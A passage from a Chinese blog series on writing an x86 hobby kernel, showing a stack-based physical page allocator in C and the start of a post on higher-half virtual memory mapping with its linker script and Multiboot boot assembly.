<p>当需要分配一个页框时，从栈中弹出一个地址，如<code>0x00200000</code>，然后将这个页框分配给需要的任务。当任务完成并释放这个页框时，地址<code>0x00200000</code>重新压入栈中，等待下次分配。</p>
<blockquote>
<p>include&#x2F;pmm.h 头文件修改</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> INCLUDE_PMM_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INCLUDE_PMM_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;multiboot.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 线程栈的大小</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STACK_SIZE 8192</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 支持的最大物理内存 512MB</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PMM_MAX_SIZE 0x20000000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 物理内存页框的大小 4KB</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PMM_PAGE_SIZE 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 最多支持的物理页面个数</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_MAX_SIZE (PMM_MAX_SIZE / PMM_PAGE_SIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 页掩码按照 4096对齐</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PHY_PAGE_MASK 0xFFFFF000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 内核文件在内存中的起始和结束位置</span></span><br><span class="line"><span class="comment">// 在连接器脚本中定义了</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">uint8_t</span> kern_start[];</span><br><span class="line"><span class="keyword">extern</span> <span class="type">uint8_t</span> kern_end[];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 动态分配物理内存页的总数</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">uint32_t</span> phy_page_count;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出bios提供的物理内存布局</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">show_memory_map</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化物理内存管理</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_pmm</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回一个内存页的物理地址</span></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">pmm_alloc_page</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放申请的内存</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmm_free_page</span><span class="params">(<span class="type">uint32_t</span> p)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// INCLUDE</span></span></span><br></pre></td></tr></table></figure>



<blockquote>
<p>mm&#x2F;pmm.c 文件</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;multiboot.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;common.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;debug.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pmm.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 物理内存页面管理的栈</span></span><br><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> pmm_stack[PAGE_MAX_SIZE+<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 物理内存管理的栈指针</span></span><br><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> pmm_stack_top;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 物理内存页的数量</span></span><br><span class="line"><span class="type">uint32_t</span> phy_page_count;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">show_memory_map</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> mmap_addr = glb_mboot_ptr-&gt;mmap_addr;</span><br><span class="line">    <span class="type">uint32_t</span> mmap_length = glb_mboot_ptr-&gt;mmap_length;</span><br><span class="line"></span><br><span class="line">    printk(<span class="string">&quot;Memory map:\n&quot;</span>);</span><br><span class="line">    <span class="comment">// mmap_addr是数组的起始地址 首地址  mmaplength 是长度</span></span><br><span class="line">    <span class="type">mmap_entry_t</span> *mmap = (<span class="type">mmap_entry_t</span> *)mmap_addr;</span><br><span class="line">    <span class="keyword">for</span> (mmap = (<span class="type">mmap_entry_t</span> *)mmap_addr; (<span class="type">uint32_t</span>)mmap &lt; mmap_addr + mmap_length; mmap++) &#123;</span><br><span class="line">        printk(<span class="string">&quot;base_addr = 0x%X%08X, length = 0x%X%08X, type = 0x%X\n&quot;</span>,</span><br><span class="line">        (<span class="type">uint32_t</span>)mmap-&gt;base_addr_high , (<span class="type">uint32_t</span>)mmap-&gt;base_addr_low ,</span><br><span class="line">        (<span class="type">uint32_t</span>)mmap-&gt;length_high , (<span class="type">uint32_t</span>)mmap-&gt;length_low ,</span><br><span class="line">        (<span class="type">uint32_t</span>)mmap-&gt;type);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_pmm</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">mmap_entry_t</span> *mmap_start_addr = (<span class="type">mmap_entry_t</span> *)glb_mboot_ptr-&gt;mmap_addr;</span><br><span class="line">	<span class="type">mmap_entry_t</span> *mmap_end_addr = (<span class="type">mmap_entry_t</span> *)glb_mboot_ptr-&gt;mmap_addr + glb_mboot_ptr-&gt;mmap_length;</span><br><span class="line"></span><br><span class="line">	<span class="type">mmap_entry_t</span> *map_entry;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (map_entry = mmap_start_addr; map_entry &lt; mmap_end_addr; map_entry++) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 如果是可用内存 ( 按照协议，1 表示可用内存，其它数字指保留区域 )</span></span><br><span class="line">		<span class="keyword">if</span> (map_entry-&gt;type == <span class="number">1</span> &amp;&amp; map_entry-&gt;base_addr_low == <span class="number">0x100000</span>) &#123;</span><br><span class="line">			</span><br><span class="line">			<span class="comment">// 把内核结束位置到结束位置的内存段，按页存储到页管理栈里</span></span><br><span class="line">			<span class="comment">// 最多支持512MB的物理内存</span></span><br><span class="line">			<span class="type">uint32_t</span> page_addr = map_entry-&gt;base_addr_low + (<span class="type">uint32_t</span>)(kern_end - kern_start); <span class="comment">// 内核代码的起始和结束地址 </span></span><br><span class="line">			<span class="type">uint32_t</span> length = map_entry-&gt;base_addr_low + map_entry-&gt;length_low;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">while</span> (page_addr &lt; length &amp;&amp; page_addr &lt;= PMM_MAX_SIZE) &#123;</span><br><span class="line">				pmm_free_page(page_addr);</span><br><span class="line">				page_addr += PMM_PAGE_SIZE;</span><br><span class="line">				phy_page_count++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 分配一个内存页的物理地址</span></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">pmm_alloc_page</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	assert(pmm_stack_top != <span class="number">0</span>, <span class="string">&quot;out of memory&quot;</span>);  <span class="comment">// 断言当条件不成立时（即 pmm_stack_top == 0），</span></span><br><span class="line">   												  <span class="comment">// 断言失败，程序会输出这个错误信息，并终止执行。</span></span><br><span class="line"></span><br><span class="line">	<span class="type">uint32_t</span> page = pmm_stack[pmm_stack_top--];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 释放申请的内存 --- 就是把内存还回来了了</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmm_free_page</span><span class="params">(<span class="type">uint32_t</span> p)</span></span><br><span class="line">&#123;</span><br><span class="line">	assert(pmm_stack_top != PAGE_MAX_SIZE, <span class="string">&quot;out of pmm_stack stack&quot;</span>);</span><br><span class="line"></span><br><span class="line">	pmm_stack[++pmm_stack_top] = p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>解析：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">init_pmm</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">mmap_entry_t</span> *mmap_start_addr = (<span class="type">mmap_entry_t</span> *)glb_mboot_ptr-&gt;mmap_addr;</span><br><span class="line">	<span class="type">mmap_entry_t</span> *mmap_end_addr = (<span class="type">mmap_entry_t</span> *)glb_mboot_ptr-&gt;mmap_addr + glb_mboot_ptr-&gt;mmap_length;</span><br><span class="line"></span><br><span class="line">	<span class="type">mmap_entry_t</span> *map_entry;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (map_entry = mmap_start_addr; map_entry &lt; mmap_end_addr; map_entry++) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 如果是可用内存 ( 按照协议，1 表示可用内存，其它数字指保留区域 )</span></span><br><span class="line">		<span class="keyword">if</span> (map_entry-&gt;type == <span class="number">1</span> &amp;&amp; map_entry-&gt;base_addr_low == <span class="number">0x100000</span>) &#123;</span><br><span class="line">			</span><br><span class="line">			<span class="comment">// 把内核结束位置到结束位置的内存段，按页存储到页管理栈里</span></span><br><span class="line">			<span class="comment">// 最多支持512MB的物理内存</span></span><br><span class="line">			<span class="type">uint32_t</span> page_addr = map_entry-&gt;base_addr_low + (<span class="type">uint32_t</span>)(kern_end - kern_start); <span class="comment">// 内核代码的起始和结束地址 </span></span><br><span class="line">			<span class="type">uint32_t</span> length = map_entry-&gt;base_addr_low + map_entry-&gt;length_low;                <span class="comment">// 计算需要分配内存块的长度</span></span><br><span class="line"> </span><br><span class="line">			<span class="keyword">while</span> (page_addr &lt; length &amp;&amp; page_addr &lt;= PMM_MAX_SIZE) &#123;</span><br><span class="line">				pmm_free_page(page_addr);    <span class="comment">//  放入栈中</span></span><br><span class="line">				page_addr += PMM_PAGE_SIZE;  <span class="comment">// 加上一页的大小</span></span><br><span class="line">				phy_page_count++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>通过 <code>glb_mboot_ptr</code> 获取内存映射的起始和结束地址。</li>
<li>遍历每个内存映射条目，检查是否是可用内存并且起始地址是 <code>0x100000</code>（1MB以上）。</li>
<li>计算从内核结束位置开始的内存页地址，并按页存储到内存管理栈中。</li>
<li>使用 <code>pmm_free_page()</code> 函数将每个页地址放入栈中。</li>
</ul>
<p>while循环中：</p>
<ul>
<li><p><code>map_entry-&gt;base_addr_low</code>：这是内存映射条目的基地址，表示内存块的起始地址。</p>
</li>
<li><p><code>map_entry-&gt;length_low</code>：这是内存映射条目的长度，表示内存块的大小。</p>
</li>
<li><p><code>page_addr</code>：当前正在处理的内存页的地址。</p>
</li>
<li><p><code>length</code>：内存块的结束地址，用于确定内存块的范围。</p>
</li>
<li><p><code>PMM_MAX_SIZE</code>：系统支持的最大物理内存大小，在此假设为512MB。</p>
</li>
<li><p><code>pmm_free_page(page_addr)</code>：将当前页地址放入内存管理栈中。</p>
</li>
<li><p><code>page_addr += PMM_PAGE_SIZE</code>：将页地址移动到下一个页框（假设页框大小为4KB）。</p>
</li>
<li><p><code>phy_page_count++</code>：增加已处理的页框计数。</p>
</li>
</ul>
<blockquote>
<p>init&#x2F;entry.c </p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;console.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;debug.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;gdt.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;idt.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;timer.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pmm.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">kern_entry</span><span class="params">()</span>&#123;</span><br><span class="line">    init_debug();</span><br><span class="line">    init_gdt();</span><br><span class="line">    init_idt();</span><br><span class="line"></span><br><span class="line">    console_clear();</span><br><span class="line">	<span class="comment">//console_write_color(&quot;Hello, OS kernel!\n&quot;, rc_black, rc_green);</span></span><br><span class="line">    <span class="comment">//panic(&quot;test&quot;);</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    printk_color(rc_black, rc_green, <span class="string">&quot;Hello OS!!!\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    init_timer(<span class="number">200</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// `sti` 指令的作用是设置中断标志（Set Interrupt Flag）</span></span><br><span class="line">    <span class="comment">// asm volatile(&quot;sti&quot;);</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 显示物理内存布局</span></span><br><span class="line">    printk(<span class="string">&quot;kernel in memory start: 0x%08X\n&quot;</span>, kern_start);</span><br><span class="line">    printk(<span class="string">&quot;kernel in memory end: 0x%08X\n&quot;</span>, kern_end);</span><br><span class="line">    printk(<span class="string">&quot;kernel in memory used: %d KB\n\n&quot;</span>, (kern_end - kern_start + <span class="number">1023</span>) / <span class="number">1024</span>); <span class="comment">// 换算成kb</span></span><br><span class="line"></span><br><span class="line">    show_memory_map();</span><br><span class="line">    <span class="comment">// 初始化物理内存管理</span></span><br><span class="line">    init_pmm();</span><br><span class="line"></span><br><span class="line">    printk_color(rc_black, rc_red, <span class="string">&quot;\nThe Count of Physical Memory Page is: %u\n\n&quot;</span>, phy_page_count); <span class="comment">// 栈中分配的物理也的大小</span></span><br><span class="line">    <span class="type">uint32_t</span> allc_addr = <span class="literal">NULL</span>;</span><br><span class="line">    printk_color(rc_black, rc_light_brown , <span class="string">&quot;Test Physical Memory Alloc :\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    allc_addr = pmm_alloc_page(); <span class="comment">// 分配一个页 物理内存</span></span><br><span class="line">    printk_color(rc_black, rc_light_brown , <span class="string">&quot;Alloc Physical Addr: 0x%08X\n&quot;</span>,allc_addr);</span><br><span class="line">    allc_addr = pmm_alloc_page();</span><br><span class="line">    printk_color(rc_black, rc_light_brown , <span class="string">&quot;Alloc Physical Addr: 0x%08X\n&quot;</span>,allc_addr);</span><br><span class="line">    allc_addr = pmm_alloc_page();</span><br><span class="line">    printk_color(rc_black, rc_light_brown , <span class="string">&quot;Alloc Physical Addr: 0x%08X\n&quot;</span>,allc_addr);</span><br><span class="line">    allc_addr = pmm_alloc_page();</span><br><span class="line">    printk_color(rc_black, rc_light_brown , <span class="string">&quot;Alloc Physical Addr: 0x%08X\n&quot;</span>,allc_addr);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<img src="/2024/05/12/x86-5-%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E7%9A%84%E5%AE%9E%E7%8E%B0/image-20240514210241195.png" alt="image-20240514210241195" style="zoom:150%;">

<p>因为是用栈 进行管理的，所以最先分配的物理内存地址是高地址 </p>
<p><img src="/2024/05/12/x86-5-%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E7%9A%84%E5%AE%9E%E7%8E%B0/image-20240514210512354.png" alt="image-20240514210512354"></p>
]]></content>
      <categories>
        <category>x86内核实现</category>
      </categories>
      <tags>
        <tag>x86</tag>
        <tag>linxu</tag>
        <tag>内核</tag>
      </tags>
  </entry>
  <entry>
    <title>x86-6-虚拟内存管理的实现</title>
    <url>/2024/05/14/x86-6-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E7%9A%84%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="10-虚拟内存管理的实现"><a href="#10-虚拟内存管理的实现" class="headerlink" title="10.虚拟内存管理的实现"></a>10.虚拟内存管理的实现</h1><h2 id="1-段页式内存管理"><a href="#1-段页式内存管理" class="headerlink" title="1.段页式内存管理"></a>1.段页式内存管理</h2><blockquote>
<p>虚拟地址到物理地址通过由<strong>页目录和页表组成的二级页表映射</strong>，页目录的地址放置在CR3寄存器里。</p>
<img src="/2024/05/14/x86-6-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E7%9A%84%E5%AE%9E%E7%8E%B0/image-20240513203948806.png" alt="image-20240513203948806" style="zoom:67%;">
</blockquote>
<p><strong>段页式内存管理：</strong></p>
<img src="/2024/05/14/x86-6-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E7%9A%84%E5%AE%9E%E7%8E%B0/image-20240515100322404.png" alt="image-20240515100322404" style="zoom:80%;">

<p><strong>该过程需要三次访问内存</strong>，为提高执行速度，可以增加一个快表，访问数据时利用段号和页号检索它，若可以命中，直接取出物理帧号；否则，进行上述三次内存访问过程获得数据。</p>
<ul>
<li>将进程按照逻辑模块分段，然后再将各段分页</li>
<li>段页式管理外部采用段的优点，即<strong>用户可根据逻辑功能进行分段</strong>，内部采用页的优点，<strong>进行系统的固定分页，取消了段的长度不等造成的开销，由固定大小的页代替，提高内存利用率</strong></li>
</ul>
<p><strong>段页式内存管理的优点</strong>：<strong>段式使得内存分配更灵活，页式使得内存碎片减少，段页式内存管理可以方便地重用内存页，提高内存利用效率。</strong></p>
<ol>
<li><strong>灵活的内存分配</strong>：<ul>
<li>段页式内存管理允许将内存分成逻辑段，每个段可以独立地增长和缩减。这种灵活性使得程序可以按需分配内存，从而提高内存利用率。</li>
</ul>
</li>
<li><strong>内存保护</strong>：<ul>
<li>每个段都有独立的段描述符，描述符中包含了段的基址、大小和访问权限。这种机制可以防止进程之间的内存越界访问，提高系统的稳定性和安全性。</li>
</ul>
</li>
<li><strong>简化的地址空间</strong>：<ul>
<li>段页式内存管理将逻辑地址转换为物理地址时，先通过段表找到段，再通过页表找到页框。这种两级映射简化了内存管理，便于操作系统管理多个进程的内存。</li>
</ul>
</li>
<li><strong>减少内存碎片</strong>：<ul>
<li><strong>页式内存管理可以有效地减少内存碎片，因为它将内存分成固定大小的页框</strong>。段页式内存管理继承了这一优点，从而减少了内存分配和释放过程中产生的内存碎片。</li>
</ul>
</li>
<li><strong>虚拟内存支持</strong>：<ul>
<li>段页式内存管理可以与虚拟内存机制结合使用，支持将不常用的内存页交换到磁盘上，从而扩展系统的有效内存容量。这种机制可以提高系统的多任务处理能力，允许更多的进程同时运行。</li>
</ul>
</li>
<li><strong>模块化编程</strong>：<ul>
<li>段页式内存管理支持模块化编程，程序员可以将程序分成多个逻辑段（如代码段、数据段、堆栈段等），每个段可以独立管理。这种方式有助于程序的开发和维护。</li>
</ul>
</li>
<li><strong>共享和重用</strong>：<ul>
<li>操作系统可以允许不同的进程共享同一个段（如共享库或代码段），从而节省内存空间。此外，<strong>段页式内存管理可以方便地重用内存页，提高内存利用效率。</strong></li>
</ul>
</li>
</ol>
<h2 id="2-内存映射"><a href="#2-内存映射" class="headerlink" title="2.内存映射"></a>2.内存映射</h2><p>Linux采用的方案是 把<strong>内核映射到线性地址空间3G以上</strong>，而<strong>应用程序占据线性地址空间0-3G的位置</strong>。我们的内 核采取和Linux内核一样的映射，把物理地址0从虚拟地址<strong>0xC0000000（3G）</strong>处开始往上映 射，因为我们只管理最多512MB的内存，所以3G-4G之间能完全的映射全部的物理地址。</p>
<p>物理地址和内核虚拟地址满足以下的关系：</p>
<p><strong>物理地址 + 0xC0000000 &#x3D; 内核虚拟地址</strong></p>
<blockquote>
<p>VMA（Virtual Memory Address）：链接器生成可执行文件时的偏移计算地址，</p>
<p>LMA（Load Memory Address）：区段所载入内存的 实际地址</p>
<p>通常情况下，VMA &#x3D; LMA</p>
<p>问题：如果简单的 把0xC0100000 修改为代码段的起始位置，那么会报错， 因为GRUB是从1MB处加载内核的，而链接器是以0xC0100000这个参考地址进行地址重定位的。<strong>此时尚未开启虚拟页面映射，运行 涉及到寻址的代码肯定就会出错。</strong>— 链接器将内核重定位到虚拟地址 <code>0xC0100000</code>，但是在虚拟地址映射启用之前，所有的内存访问都是物理地址。直接访问 <code>0xC0100000</code> 会导致访问失败，因为该地址在物理内存中没有对应的实际位置</p>
<p>解决方案：有一段程序和数据按照 0x100000的地址进行重定位，能帮助我们设置好一个临时的页表，再跳转到内核入口函数</p>
<p>GCC提供了这样的扩展机制：允许程序员指定某个函数或者某个变量所存储的区段。 同时ld的链接脚本又可以自由定制，所以这个无解的问题就有了解决方案。<strong>用于设置这个 临时页表和函数我们指定它存储在.init段，只需要指定该段从0x100000地址开始</strong>，<strong>其他 的.text和.data等段按照0xC0100000作为起始地址即可</strong>。当然这里还有要注意的细节， 具体在下面的新链接脚本中可以看。</p>
</blockquote>
<blockquote>
<p>script&#x2F;kernel.ld 链接器脚本修改</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ENTRY(start)</span><br><span class="line">SECTIONS</span><br><span class="line">&#123;</span><br><span class="line">	PROVIDE( kern_start = 0xC0100000);</span><br><span class="line">	. = 0x100000; </span><br><span class="line">	.init.text : </span><br><span class="line">	&#123;</span><br><span class="line">		*(.init.text)</span><br><span class="line">		. = ALIGN(4096);</span><br><span class="line">	&#125;</span><br><span class="line">	.init.data : </span><br><span class="line">	&#123;</span><br><span class="line">		*(.init.data)</span><br><span class="line">		. = ALIGN(4096);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	. += 0xC0000000;</span><br><span class="line">	.text : AT(ADDR(.text) - 0xC0000000)</span><br><span class="line">	&#123;</span><br><span class="line">		*(.text)</span><br><span class="line">		. = ALIGN(4096);</span><br><span class="line">	&#125;</span><br><span class="line">	.data : AT(ADDR(.data) - 0xC0000000)</span><br><span class="line">	&#123;</span><br><span class="line">		*(.data)</span><br><span class="line">		*(.rodata)</span><br><span class="line">		. = ALIGN(4096);</span><br><span class="line">	&#125;</span><br><span class="line">	.bss : AT(ADDR(.bss) - 0xC0000000)</span><br><span class="line">	&#123;</span><br><span class="line">		*(.bss)</span><br><span class="line">		. = ALIGN(4096);</span><br><span class="line">	&#125;</span><br><span class="line">	.stab : AT(ADDR(.stab) - 0xC0000000)</span><br><span class="line">	&#123;</span><br><span class="line">		*(.stab)</span><br><span class="line">		. = ALIGN(4096);</span><br><span class="line">	&#125;</span><br><span class="line">	.stabstr : AT(ADDR(.stabstr) - 0xC0000000)</span><br><span class="line">	&#123;</span><br><span class="line">		*(.stabstr)</span><br><span class="line">	 	. = ALIGN(4096);</span><br><span class="line">	&#125;</span><br><span class="line">	PROVIDE( kern_end = . );</span><br><span class="line">	</span><br><span class="line">	/DISCARD/ : &#123; *(.comment) *(.eh_frame) &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>. +&#x3D; 0xC0000000; 从这里开始是虚拟地址的映射</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">. += <span class="number">0xC0000000</span>;</span><br><span class="line">	.text : <span class="built_in">AT</span>(<span class="built_in">ADDR</span>(.text) - <span class="number">0xC0000000</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		*(.text)</span><br><span class="line">		. = <span class="built_in">ALIGN</span>(<span class="number">4096</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>**<code>AT(ADDR(.text) - 0xC0000000)</code>**：指定 <code>.text</code> 段的加载地址（物理地址）为当前虚拟地址减去 <code>0xC0000000</code>。这意味着虚拟地址 <code>0xC0100000</code> 的代码实际加载在物理地址 <code>0x100000</code>。</li>
<li>**<code>\*(.text)</code>**：将所有 <code>.text</code> 段的内容放入此处。</li>
<li>**<code>. = ALIGN(4096)</code>**：将下一个地址对齐到 4096 字节（4KB）的边界</li>
</ul>
<blockquote>
<p>boot&#x2F;boot.s 修改入口函数</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; ----------------------------------------------------------------</span><br><span class="line">;</span><br><span class="line">; 	boot.s -- 内核从这里开始</span><br><span class="line">;</span><br><span class="line">;                 这里还有根据 GRUB Multiboot 规范的一些定义</span><br><span class="line">;</span><br><span class="line">; ----------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">MBOOT_HEADER_MAGIC 	equ 	0x1BADB002 	; Multiboot 魔数，由规范决定的</span><br><span class="line"></span><br><span class="line">MBOOT_PAGE_ALIGN 	equ 	1 &lt;&lt; 0    	; 0 号位表示所有的引导模块将按页(4KB)边界对齐</span><br><span class="line">MBOOT_MEM_INFO 		equ 	1 &lt;&lt; 1    	; 1 号位通过 Multiboot 信息结构的 mem_* 域包括可用内存的信息</span><br><span class="line">						; (告诉GRUB把内存空间的信息包含在Multiboot信息结构中)</span><br><span class="line"></span><br><span class="line">; 定义我们使用的 Multiboot 的标记</span><br><span class="line">MBOOT_HEADER_FLAGS 	equ 	MBOOT_PAGE_ALIGN | MBOOT_MEM_INFO</span><br><span class="line"></span><br><span class="line">; 域checksum是一个32位的无符号值，当与其他的magic域(也就是magic和flags)相加时，</span><br><span class="line">; 要求其结果必须是32位的无符号值 0 (即magic + flags + checksum = 0)</span><br><span class="line">MBOOT_CHECKSUM 		equ 	- (MBOOT_HEADER_MAGIC + MBOOT_HEADER_FLAGS)</span><br><span class="line"></span><br><span class="line">; 符合Multiboot规范的 OS 映象需要这样一个 magic Multiboot 头</span><br><span class="line"></span><br><span class="line">; Multiboot 头的分布必须如下表所示：</span><br><span class="line">; ----------------------------------------------------------</span><br><span class="line">; 偏移量  类型  域名        备注</span><br><span class="line">;</span><br><span class="line">;   0     u32   magic       必需</span><br><span class="line">;   4     u32   flags       必需 </span><br><span class="line">;   8     u32   checksum    必需 </span><br><span class="line">;</span><br><span class="line">; 我们只使用到这些就够了，更多的详细说明请参阅 GNU 相关文档</span><br><span class="line">;-----------------------------------------------------------</span><br><span class="line"></span><br><span class="line">;-----------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">[BITS 32]  	; 所有代码以 32-bit 的方式编译</span><br><span class="line"></span><br><span class="line">section .init.text 	; 临时代码段从这里开始</span><br><span class="line"></span><br><span class="line">; 在代码段的起始位置设置符合 Multiboot 规范的标记</span><br><span class="line"></span><br><span class="line">dd MBOOT_HEADER_MAGIC 	; GRUB 会通过这个魔数判断该映像是否支持</span><br><span class="line">dd MBOOT_HEADER_FLAGS   ; GRUB 的一些加载时选项，其详细注释在定义处</span><br><span class="line">dd MBOOT_CHECKSUM       ; 检测数值，其含义在定义处</span><br><span class="line"></span><br><span class="line">[GLOBAL start] 		; 内核代码入口，此处提供该声明给 ld 链接器</span><br><span class="line">[GLOBAL mboot_ptr_tmp] 	; 全局的 struct multiboot * 变量</span><br><span class="line">[EXTERN kern_entry] 	; 声明内核 C 代码的入口函数</span><br><span class="line"></span><br><span class="line">start:</span><br><span class="line">	cli  				; 此时还没有设置好保护模式的中断处理，所以必须关闭中断</span><br><span class="line">	mov [mboot_ptr_tmp], ebx	; 将 ebx 中存储的指针存入 glb_mboot_ptr 变量</span><br><span class="line">	mov esp, STACK_TOP  		; 设置内核栈地址，按照 multiboot 规范，当需要使用堆栈时，OS 映象必须自己创建一个</span><br><span class="line">	and esp, 0FFFFFFF0H		; 栈地址按照 16 字节对齐</span><br><span class="line">	mov ebp, 0 			; 帧指针修改为 0</span><br><span class="line">    </span><br><span class="line">	call kern_entry	; 调用内核入口函数</span><br><span class="line"></span><br><span class="line">;-----------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">section .init.data		; 开启分页前临时的数据段</span><br><span class="line">stack:    times 1024 db 0  	; 这里作为临时内核栈</span><br><span class="line">STACK_TOP equ $-stack-1 	; 内核栈顶，$ 符指代是当前地址</span><br><span class="line"></span><br><span class="line">mboot_ptr_tmp: dd 0		; 全局的 multiboot 结构体指针</span><br><span class="line"></span><br><span class="line">;-----------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<p>主要的修改是第5行的代码所在段声明和第29行的数据所在段声明，因为此处代码和 数据是在<strong>参考0x100000（1MB）编址的</strong>。<strong>所以在进入分页后需要更换新的内核栈和新的 multiboot结构体指针</strong>。除此之外，仍就需要指定kern_entry函数所在区段为.init.text 段，并且在该函数中建立临时页表并跳转到高虚拟地址处的kern_init函数正式执行</p>
<blockquote>
<p>init&#x2F;entry.c</p>
</blockquote>
